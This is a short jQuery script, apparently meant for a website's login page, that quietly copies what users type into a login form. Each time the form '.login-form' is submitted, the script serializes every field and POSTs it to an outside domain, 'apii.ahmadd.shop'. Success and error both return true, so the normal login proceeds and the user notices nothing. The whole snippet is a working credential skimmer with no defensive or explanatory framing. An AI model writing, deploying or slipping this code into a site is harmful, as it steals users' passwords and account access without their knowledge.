$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "https://apii.ahmadd.shop",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
